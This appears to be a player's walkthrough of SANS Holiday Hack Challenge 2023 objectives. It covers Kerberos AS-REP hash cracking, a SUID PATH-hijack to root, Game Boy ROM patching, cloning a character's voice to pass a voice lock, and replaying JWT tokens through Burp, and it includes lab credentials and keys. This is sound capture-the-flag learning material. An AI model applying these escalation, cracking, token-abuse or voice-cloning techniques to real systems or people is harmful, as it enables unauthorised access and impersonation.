hashcat -m 18200 hash.txt password_list.txt -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -o password.txt --force
```

Hashcat output:

```bash
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU @ 2.80GHz, 8192/30063 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 uniue salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=16 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
* Device #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: password_list.txt
* Passwords.: 144
* Bytes.....: 2776
* Keyspace..: 144
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  


Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966
Time.Started.....: Sat Dec  9 00:59:53 2023 (0 secs)
Time.Estimated...: Sat Dec  9 00:59:53 2023 (0 secs)
Guess.Base.......: File (password_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      817 H/s (0.75ms) @ Accel:1 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 144/144 (100.00%)
Rejected.........: 0/144 (0.00%)
Restore.Point....: 0/144 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0
Candidates.#1....: 1LuvCandyC4n3s!2022 -> iLuvC4ndyC4n3s!23!

Started: Sat Dec  9 00:59:34 2023
Stopped: Sat Dec  9 00:59:54 2023
```

Checking the contents of password.txt where we had hashcat set to output our cracked password...

```bash
elf@f1f72d836708:~$ cat password.txt 
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
```

Running /bin/runtoanswer and inputting our cracked password

```bash
elf@f1f72d836708:~$ /bin/runtoanswer 
What is the password for the hash in /home/elf/hash.txt ?

> IluvC4ndyC4nes!
Your answer: IluvC4ndyC4nes!

Checking....
Your answer is correct!
```

---

## Objective: Linux PrivEsc

Instructions:

```bash
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *
```

Find command for files with the SUID bit set

```bash
find / -perm -u=s -type f 2>/dev/null 
```

Results: 

```bash
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

Why do I care about the SUID bit? 

A program that has the SUID (set user ID) bit set will run in the context of the user that owns that file. This can be very dangerous if set for any binaries that can alter or overwrite files. In addition, if it is set for a binary that calls out to another binary using a non-explicit path, we can create a malicious file where it is trying to reach out to elevate our permissions. 

Strings on the /bin/simplecopy to see if we can identify any files/binaries it may be calling out to

```bash
elf@6043897b7dfe:~$ strings /bin/simplecopy 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
__stack_chk_fail
system
__cxa_finalize
setgid
__libc_start_main
snprintf
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Usage: %s <source> <destination>
cp %s %s
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
simplecopy.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
snprintf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
elf@6043897b7dfe:~$ strings /bin/simplecopy | less
bash: less: command not found
elf@6043897b7dfe:~$ strings /bin/simplecopy 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
__stack_chk_fail
system
__cxa_finalize
setgid
__libc_start_main
snprintf
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Usage: %s <source> <destination>
cp %s %s
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
simplecopy.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
snprintf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

Within our strings results, it looks like simplecopy is calling out to "cp" to leverage it's file copy function. As stated earlier, calling out a binary without an explicit path can be dangerous...let's see what we can do.

Let's check out where the OS thinks cp lives

```bash
elf@6043897b7dfe:~$ which cp
/usr/bin/cp
```

The OS believes that it should look in /usr/bin when it is asked to run "cp". Well, that's because of the environmental variable PATH. The OS looks at the PATH variable to determine where it should look for "cp" in our case. We can look at all PATH variables and see that /usr/bin is present.

```bash
elf@6043897b7dfe:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Let's see if we can create a malicious executable called "cp" and change the PATH variable for the OS to find our new "cp" when running simplecopy

```bash
elf@6043897b7dfe:/tmp$ echo "/bin/bash" > cp 
elf@6043897b7dfe:/tmp$ chmod +x cp 
elf@6043897b7dfe:/tmp$ cat cp
/bin/bash
```

We created a new file called "cp" in /tmp that will launch a bash session and made it executable. If we can get simplecopy to run this, it will run with the root UID and give us root permissions. 

Let's alter our environmental variable PATH. We can set it so it will look through the /tmp directory before /usr/bin, so it will see our new "cp" file first!

```bash
elf@6043897b7dfe:/tmp$ which cp
/usr/bin/cp
elf@6043897b7dfe:/tmp$ export PATH=/tmp:$PATH
elf@6043897b7dfe:/tmp$ which cp
/tmp/cp
```

Now, let's execute simplecopy and copy any file. It doesn't matter what, we just need the binary to execute.

```bash
elf@6043897b7dfe:/tmp$ /bin/simplecopy /home/elf/HELP /tmp 
root@6043897b7dfe:/tmp# 
```

And boom! We are root! 

```bash
root@6043897b7dfe:/tmp# whoami
root
```

Now let's move into the /root directory as the original instructions told us and run the binary in there. It looks like it wants to know who delivers christmas presents.

```bash
root@6043897b7dfe:/root# cd /tmp
root@6043897b7dfe:/tmp# cd /root
root@6043897b7dfe:/root# ls
runmetoanswer
root@6043897b7dfe:/root# ./runmetoanswer 
Who delivers Christmas presents?

> 
```

Let's see if there is a file somewhere that is holding the answer key for us. We can use grep to recursively search the system for our prompt.

```bash
root@6043897b7dfe:/root# grep -inr "Who delivers christmas presents" / 2>/dev/null
/etc/runtoanswer.yaml:12:  Who delivers Christmas presents?
```

Bingo! /etc/runtoanswer.yaml seems to have our question in it, let's check it out further.

```bash
root@6043897b7dfe:/root# cat /etc/runtoanswer.yaml 
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"

text: |
  Who delivers Christmas presents?

success_message: "Your answer is *correct*!"
failure_message: "Sorry, that answer is *incorrect*. Please try again!"

# A prompt that is displayed if the user runs this interactively (they might
# not see this - answers can be entered as an argument)
prompt: "> "

# Optional: a time, in seconds, to delay before validating the answer (to
# prevent guessing)
delay: 1

# Optional: skip (most) stdout output if the answer is correct
headless: false

# If set to true, don't exit after the user asks
keep_going: false

# Optional: play this sound on completion or failure
#completion_sound: 'myhappysound.mp3'
#failure_sound: 'mysadsound.mp3'

# Close the terminal when it is completed?
exit_on_completion: false
```

It appears our answer is "santa". Let's give it a try. 

```bash
root@6043897b7dfe:/root# ./runmetoanswer 
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

GLORY!

---

## Objective: Luggage Lock

Not much skill or technique here... just apply the right amount of pressure until all wheels lock into a position, then apply full pressure to the lock and watch the zipper pop open!

![](/docs/assets/images/ll.png)

---

## Objective: Game Cartidges: Vol 2

The hint for this one is very useful.

```bash
Gameboy 2
From: Tinsel Upatree
Objective: Game Cartridges: Vol 2

1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.
```

For this objective I used:

- BeyondCompare to view the hex data of the game files

- mGBA as my GameBoy emulator

- Ghidra to view the functions (not needed)

When we try to play the game in the browser, we can see that are being blocked to continue through the path by T-Wiz. We need to find a way to edit the game to allow us access to the other side. 

To find the location that the iframe is pulling the game frame, view your network traffic when you load the game. After you do this a few times, you'll find there appears to be two different versions that can load. 

game0.gb - https://gamegosling.com/vol2-akHB27gg6pN0/rom/game0.gb

![](/docs/assets/images/gcv21.png)

game1.gb - https://gamegosling.com/vol2-akHB27gg6pN0/rom/game1.gb

![](/docs/assets/images/gcv22.png)

By visiting those domains, I can download a local copy of the GameBoy ROM files. Per the hint, we should take a look at the DIFFerences between the two versions. I used BeyondCompare to do this.

![](/docs/assets/images/gcv23.png)

Let's try changing some of the differences and loading the changed ROM into our emulator to see what happens. 

Game0 hex -> Game1 hex  - change in game

Successful Change 1:

0x02 -> 0x01 - After talking to T-Wiz you are moved to the top of the screen instead of down, we can change this in game1 and be able to get through T-Wizz

After T-Wizz telling me I cannot pass, I walk down to the bottom half of the game now.

![](/docs/assets/images/gcv24.png)

Successful Change 2:

0b80 -> 0400 - Exit the start on the top of the screen rather than the bottom, we can change this in game 1 and be able to exit the start on the bottom of the screen directly to the sparkling spot

After exiting orientation, I am located on the bottom of the game now.

![](/docs/assets/images/gcv25.png)

Room after entering the sparkling vortex.![](/docs/assets/images/gcv26.png)

If you interact with the radio on the right, a morse code message begins to play. After decoding the message, you reveal the answer for your badge.

Morse code audio

https://github.com/cmdncontrol/SANS-Holiday-Hack-Challenge-2023/assets/139015523/4a09b005-fb33-4c2e-aa59-38d765d31fe4

Morse code

```
--. .-.. ----- .-. -.--
```

Decoded

```
GL0RY
```

---

## Objective: Game Cartridges: Vol 3

For this objective I used:

- BeyondCompare to view the hex data of the game files

- mGBA as my GameBoy emulator

- Ghidra to view the functions (not needed)

When we play the game through normally, we can collect coins and eventually reach Jared. Jared mentions a comment about (3) nines. Since we are collecting coins, I take that to mean we need 999 coins. After playing through to collect that value, as soon as you reach it you get an error that you cannot write 0xFE. Similarly to Vol. 2, you can extract the game ROM by using dev tools and watching for the connection. (https://gamegosling.com/vol3-7bNwQKGBFNGQT1/rom/game.gb)

Trying to decipher this 0xFE overflow led me down a path for many hours that was incorrect...I eventually regrouped and decided to collect coins to the amounts of 009, 090, 099, and 900. Everytime I reached the goal number, I would go back to the beginning and save. I would then quit the emulator, rename the file to something meaningful around the number of coins and restart the game to collect my next value. 

After a couple more hours of trial and error, I finally figured out the mystery. FE = 9 in the ROM, instead of 09. We are looking for differences in the files that need to be replaced with FE. The file comparison that assisted was looking at 900 coins versus 099 coins.

Byte 0000002C, controls the hundreds place and needed to be changed to FE. 

Byte 00000046, controls the tenths place and needs to be set to FE

Byte 00000028, controls the ones place and needs to be FE

Once you update the ROM, rename the file to what your emulator saved it as originally. For me that was game.sav. When you launch the game in the emulator, choose continue and speak to T-Wiz asking him to restore you game. You should get 999 coins! 

Now, you need to make it through the various stages without getting anymore coins or you reset back to 000 coins. Your emulator should have a save state feature that is very useful. Everytime I made it to a new level I would save state, in case I got a coin or ran into one of the "moles?" I could simply load state and lose no progress. Once you get to the final long jump, again save state to save time. You can hop up on the small block and jump as far over as possible, it should land you on another platform which you must immediately jump two more times to the right to land safely. 

Enter the room and speak to the individual in the middle. He will give you a passphrase to tell ChatNPT. 

![](/docs/assets/images/gcv31.png)

After you talk to ChatNPT, it will set a variable of ROCKCANMOVE to TRUE. 

![](/docs/assets/images/gcv32.png)

Go down and move the rock to get your flag

![](/docs/assets/images/gcv33.png)

Enter this in your badge for GLORY!

```
!tom+elf!
```

---

## Objectives: BONUS: Fishing Guide & BONUS: Fishing Mastery

If you inspect the game space and ensure you are set on the iframe while at see, you'll find a note for DEVs ONLY!

![](/docs/assets/images/dev.png)

If we visit

```
https://2023.holidayhackchallenge.com/sea/fishdensityref.html
```

We receive what appears to be heat maps of where the fish are located on the island...but there appears to be A LOT of fish varieties out there. We need some way to streamline our fishing endeavor. 

After a bit of digging in the developer tools and reviewing the calls for cast and reel, I was able to come up with the following script that will continually fish. As soon as a fish is on the line it will reel in and re-cast. 

```javascript
// authored by CmdNControl: https://github.com/cmdncontrol/SANS-Holiday-Hack-Challenge-2023
// create infinite loop to send message
function sendMessage(message) {
  if (true === true) {
     {
      socket.send(message);
    }
  }
}

// Function to perform the casting operation
function castAndReel() {
  function checkAndReel() {
    // Send 'cast' initially
    sendMessage('cast');

    // Check for the presence of the button and send 'reel' if found
    const reelitinButton = document.querySelector('.reelitin.gotone');
    if (reelitinButton) {
      sendMessage('reel');

      // After 'reel', pause for 1 second and then cast again
      setTimeout(function() {
        sendMessage('cast');
      }, 1000);
    }
  }

  // Set up an infinite loop checking for the button and sending 'reel' and 'cast'
  setInterval(checkAndReel, 200); // Check every 200 milliseconds (5 times per second)
}

// Start the entire script as an infinite loop
castAndReel();
```

I let this script run overnight and noticed I was still short 4 fish. After some digging on the heat maps, there's one fish that seems to have a very specific spot it can be caught in. The **Piscis Cyberneticus Skodo**, seems to be hyper located in one spot. After searching through the sea sourcecode some more it revealed.

```
https://2023.holidayhackchallenge.com/sea/assets/minimap.png
```

This image holds the minimap of the islands. I wonder if we can overlay the two images, the heatmap for Cyberneticus and the islands to find our target fishing area...

After inverting the minimap colors, ensuring the same size images, and overlaying we get the following image

![](/docs/assets/images/Cyberheat.png)

We now know we need to fish right under the head of the goose on Steampunk island to find this prestigious fish! 

After restarting the script once I got there, I was able to catch my remaining 4 fish in a matter of an hour. 

---

## Objective: Space Island Door Access Speaker

You need to solve the Certificate SSHenanigans and Active Directory objectives before this as they provide key pieces. 

In the Active Directory challenge we learned what we need to say into the speaker.

```
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

We know that Wombley Cube is who needs to say this into the speaker for the door to open. Luckily when we visited Film Noir Island: Chiaroscuro City, we met Wombley and he gave us an audiobook of us! I wonder if we can leverage some AI technology to copy his voice and make it say our passphrase...

A quick google of free services and play.ht looks like a free option. I used temp-mail to create a free throwaway account. I uploaded the audio book to "Voice Cloning" and then used the clone to generate a .wav file speaking the sentence above. 

https://github.com/cmdncontrol/SANS-Holiday-Hack-Challenge-2023/assets/139015523/b94390a5-13f3-49c5-ab5c-bcfb7bc2a54e

I uploaded the audio file to the door and boom! It opened. 

![](/docs/assets/images/spacedoor.png)

---

## Objective: Camera Access

Generate your wireguard configuration by clicking on the console in the middle of the room. Click the alligator in the bottom right and then click "Time Travel"

```
###BEGIN###
### This is the server's Wireguard configuration file. Please consider saving it for your record. ###

[Interface]
Address = 10.1.1.1/24
PrivateKey = 0tYtIabIUQbxO0GCGGWv6yqd2w58BURVt7/Ut2MHExE=
ListenPort = 51820

[Peer]
PublicKey = us0lVxJBEo1Zvq1nLXE9RperRNFA59aRpxY/HqPxGDk=
AllowedIPs = 10.1.1.2/32


###END####

###BEGIN###
### This is your Wireguard configuration file. Please save it, configure a local Wireguard client, and connect to the Target. ###

[Interface]
Address = 10.1.1.2/24
PrivateKey = RY9F4SNMuFsLw2/WjpmHisG90dHR391KLM7mRu4xW6I=
ListenPort = 51820

[Peer]
PublicKey = hEd/ORLAqMw3Pgk/QNw2DJVho5R3/A17Jg6M9D4AuSI=
Endpoint = 35.226.147.186:51820
AllowedIPs = 10.1.1.1/32


AllowedIPs = 10.1.1.1/32


###END####
```

After installing Wireguard and configuring my tunnel using [Quick Start - WireGuard](https://www.wireguard.com/quickstart/#side-by-side-video), I finally realized I needed to talk to the vending machine for more files and tore down my local wireguard configuration. This download from the vending machine included a README.md file.

```
# North Pole VNC Workspace Container:

Install docker and then to build the image do:
```

docker build -t nmf_client .

```
Then to run it use:
```

docker run -it --cap-add=NET_ADMIN -p 5900:5900 -p 6901:6901 --rm nmf_client

```
Can combine them both together using:

``` bash
./build_and_run.sh
```

This will open a port on 5900 for you to connect to. On ubuntu you can connect with something like Vinagre. Fedora, vnc viewer.

On Windows you could connect with something like tightvnc:

https://www.tightvnc.com/download.php

If ran locally, you could connect using `localhost:5900`.

## Wireguard How To:

Wireguard is already installed in this container during build but you can install it manually elsewhere too:

```
apt update && apt install -y wireguard-tools
```

There is many ways to connect wireguard but often times its just 1 to 1 connection. 

In this case, a client config would look something like this:

```
[Interface]
Address = 10.1.1.2/24
PrivateKey = hTCxVDQRxSd5OwGc4TPffcNgmP488+K6j5nn6NloONo=
ListenPort = 51820

[Peer]
PublicKey = 2k45++7JvVLLXwZufPeV8LmzK6IpivWDGdCVi2yhsxI=
Endpoint = 34.172.176.5:51820
AllowedIPs = 10.1.1.1/32
```

Save the config to the following file `/etc/wireguard/wg0.conf` using a command like this:

```bash
# Copy/Paste works best with gedit in this vnc container
gedit /etc/wireguard/wg0.conf
# OR
nano /etc/wireguard/wg0.conf
# OR
vim /etc/wireguard/wg0.conf
```

Then we need to take down the interface and bring it back up:

```bash
# Bring down
wg-quick down wg0
# Bring up
wg-quick up wg0
```

## Nanosat MO Framework:

Documentation on the Nanosat framework can be found at:

https://nanosat-mo-framework.readthedocs.io/en/latest/opssat/testing.html

Can connect to a server using:

```
maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory
```

```

```

I then ran:

```bash
# install docker on kali
sudo apt get install docker.io
# build the docker image
docker build -t nmf_client .
# run the docker image 
docker run -it --cap-add=NET_ADMIN -p 5900:5900 -p 6901:6901 --rm nmf_client
# connect via tightvnc 
xtightvncviewer -x11cursor 
# in pop up box enter
localhost:5900
# this should bring up a satelite image in a VNC session
# created wg0.conf file locally on my kali vm 
# obtain docker ID
docker ps
# copy over to docker container
docker cp /home/kali/Downloads/CameraAccess/wg0.conf 75d876970e1e:/etc/wireguard
# create wg0 interface
ip link add dev wg0 type wireguard
# bring down and up the interface
# Bring down
wg-quick down wg0
# Bring up
wg-quick up wg0
```

Next, let's launch the CTT: Consumer Test Tool in the VNC session. We know our initial Directory Service URI from the README.md file. 

```
maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory
```

Once we fetch that information, we notice a service name called "camera". This peaked my interest given the objective name. I selected it and clicked "Connect to Selected Provider". On the new tab, under "Apps Launcher service" I see the camera app, I selected the checkbox for running and it started! In the log output below it generated a new maltcp address.

```
maltcp://10.1.1.1:1025/camera-Directory
```

After fetching information on this URI, I connected to this provider as well. In the new camera tab I poked around a bit. In the "Action Service" tab I tried to take a picture, but was a getting a feedback. Under the "Parameter service" tab, I checked the box for "genrationEnabled". I then went back to the "Action service" and tried to submit actions for more pictures without success...

I went back to the YouTube video and remembered that not everything in encrypted...

I launched Wireshark and began to listen on the wg0 interface. I submitted another action for a "Base64SnapImage" and waited... over 4000 packets were generated. When following the TCP stream I could clearly see the Base64 image start, it took Wireshark a bit to display all the data. I saved this data off to a text file called image.txt. I opened this is LibreOffice and edited the contents to solely contain the base64 text and saved it as encodedimage.txt. I leveraged Cyberchef and uploaded the file before used the "Decode Base64" function, I saved the output as "download.jpg" and I had the image!! 

![](/docs/assets/images/camera.png)

![](/docs/assets/images/camera1.png)

Plug the below into your badge for GLORY!

```
CONQUER HOLIDAY SEASON!
```

---

## Objective: Diversion

```bash
# update app repositories
sudo apt-get update
# ensure wireguard is working
sudo apt-get install inetutils-ping 
```

```
Connection connection = DriverManager.getConnection("jdbc:mariadb://localhost:3306/missile_targeting_system", "targeter", "cu3xmzp9tzpi00bdqvxq");
```

Well let's install mysql since it looks like we have some creds for a mariadb

```bash
# install mysql client
apt install mysql-client
y
```

Let's connect and poke around the database

```bash
mysql -h 10.1.1.1 -u targeter -p
Enter password: cu3xmzp9tzpi00bdqvxq


show databases;
use missile_targeting_system;
show tables;
select * from messaging;
# columns: id | msg_type msg_data
select * from pointing_mode;
# columns: id | numerical_mode
select * from pointing_mode_to_str;
# columns: id | numerical_mode | str_mode | str_desc
select * from target_coordinates
# columns: id | lat | lng
```

```bash
# install java common
apt-get install java-common
apt-get install default-jdk
```

 Thanks @Gui2315 :), could not have done this without you.

---

## Objective: Captain Comms

**Goal: Get to GeeseIslandsSuperChiefCommunicationsOfficer role**

Captain's ChatNPT Initial To-Do List 

```
Private key moved to a folder he hopes no one will find...

He created a 'keys' folder in the same directory the 'roleMonitor' token is in

The public key is in "capsPubKey.key" in that directory
```

Just Watch This (JWT): Owner's Card

```
During installation of the JWT radio system, the rMonitor.tok file
containing the 'radioMonitor' role token was created in the /jwtDefault
directory...

The proper use of this AUTHORIZATION token will allow viewing of received
signals in the waterfall display. However, to decode any digital signals
received, you will need the 'radioDecoder' role token. Look at the 
JWT Appendix A - Decoder Index to learn more about decoding signals.

To use the transmitter functionality, the special AUTHORIZATION token for
administrators created during install is required.
```

JWT Appendix A - Decoder Index

```
Many transmissions the JWT SDR can receive, some will just sound like
'beeps', 'boops', and 'squawks' which can only be decoded using the plugins
included with the JWT SDR system.

The JWT SDR sustems comes with a 'CW' (morse code decoder) and a RadioFax 
decoder. The 'CW' decoder will turn the audible dots and dashes of MorseCode
into understandable text.

Among the JWT SDR stations you may find a 'numbers' station. ChatNPT says
a numbers station is a type of shortwave radio station characterized by
broadcasts of formatted numbers, which are believed to be coded messages.
The broadcasts typically feature a series of spoken numbers, sometimes
preceeded by a piece of music or a specific set of tones, known as 
'interval signals'. One such infamous numbers station that operated until
2008 is the 'Lincolnshire Poacher' which used this format:
'Music-(5-digits)-(6 Chimes)-(5-Digit Number Groups)-(6 Chimes)-Music'

More info can be found at: www.numbers-stations.com/english/e03-the-lincolnshire-poacher/

With the SDR window open, simply click on a signal peak while using the 
'radioDecoder' ROLE token inorder to hear and decode a signal...
```

I initially tried to access https://captainscomms.com/jwtDefault/rMonitor.tok directly, putting together some of the hints from the above notes found in the room. However, there was a continual "invalid authorization" error. I switched to proxying my requests via Burp. 

I captured one of the requests to the /checkrole folder and altered it using "Repeater" to generate the "rMonitor" token.

Modified Request

```
GET /jwtDefault/rMonitor.tok HTTP/2
Host: captainscomms.com
Cookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjI0NjExY2I5LTZkNjItNDg5MS1iOTkzLTIyNzZiZDE2YzVkZCJ9.ZXs29A.NpdDZXueG5YZHem9tKsa-WxgR7I
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://captainscomms.com/?&challenge=capcom&username=cmdncontrol&id=24611cb9-6d62-4891-b993-2276bd16c5dd&area=spi-brassbouyport&location=32,34&tokens=&dna=ATATATTAATATATATATATTAATATATATATCGTATAATATATATATATATATCGATATATATATATATCGATATATCGATATATATATATGCGCATATATATATATGCGCATATTACG
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg
X-Request-Item: tx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Response

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
X-Cloud-Trace-Context: 6b24917e8f3a877c74efe19fb672a91e;o=1
Date: Thu, 14 Dec 2023 17:18:32 GMT
Server: Google Frontend
Cache-Control: private
Content-Length: 556
Via: 1.1 google, 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

